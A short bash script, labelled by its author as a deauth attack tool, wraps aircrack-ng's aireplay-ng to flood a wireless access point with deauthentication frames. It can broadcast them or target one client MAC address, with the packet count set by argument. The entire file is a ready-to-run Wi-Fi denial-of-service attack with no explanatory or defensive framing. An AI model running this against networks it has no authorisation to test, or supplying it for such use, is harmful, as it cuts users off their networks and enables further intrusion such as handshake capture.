#!/bin/bash

# This script created by NeoTux is a deauth attack tool
# Usage : ./deauth.sh <interface> <packet-num> <gateway-mac> <client-mac>
# Note : This script needs aircrack-ng

# Check arguments
if [[ -z $1 || -z $2 || -z $3 ]]; then
    echo -e 'Usage : ./deauth.sh <interface> <packet-num> <gateway-mac> <client-mac>'
    exit 1
fi

# Store variables
interface=$1
packet_num=$2
gateway_mac=$3
client_mac=$4

# In case of broadcasting
if [[ -z $client_mac ]]; then
	echo -e "[*] Broadcasting $packet_num deauth packet to $gateway_mac"
	aireplay-ng -0 $packet_num -a $gateway_mac $interface --ignore-negative-one > /dev/null

# In case of one client
else
	echo -e "[*] Sending $packet_num deauth packet to $client_mac"
	aireplay-ng -0 $packet_num -a $gateway_mac -c $client_mac $interface --ignore-negative-one > /dev/null
fi